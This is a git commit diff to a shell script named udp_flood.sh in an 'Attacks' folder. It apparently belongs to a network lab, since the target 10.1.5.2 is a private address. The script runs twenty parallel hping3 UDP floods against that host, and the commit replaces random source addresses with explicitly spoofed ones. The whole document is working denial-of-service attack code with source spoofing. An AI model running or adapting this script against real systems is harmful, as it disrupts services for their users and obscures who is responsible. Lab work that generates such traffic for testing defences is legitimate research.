7a2d5e559a247e6436e92abad28a556d19c1d5fb
Sean Lee <seanklee04@gmail.com>
2026-04-26 11:25:56 -0400

    Update udp_flood.sh

--- Attacks/udp_flood.sh
+++ Attacks/udp_flood.sh
@@ -1,5 +1,6 @@
 for i in {1..20}; do
-  sudo hping3 -I eth1 --rand-source -2 -p 12345 -d 1400 --flood 10.1.5.2 &
+  RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
+  sudo hping3 -I eth1 -2 -p 12345 -d 1400 --flood -a $RANDOM_IP 10.1.5.2 &
 done
 read
 sudo pkill hping3
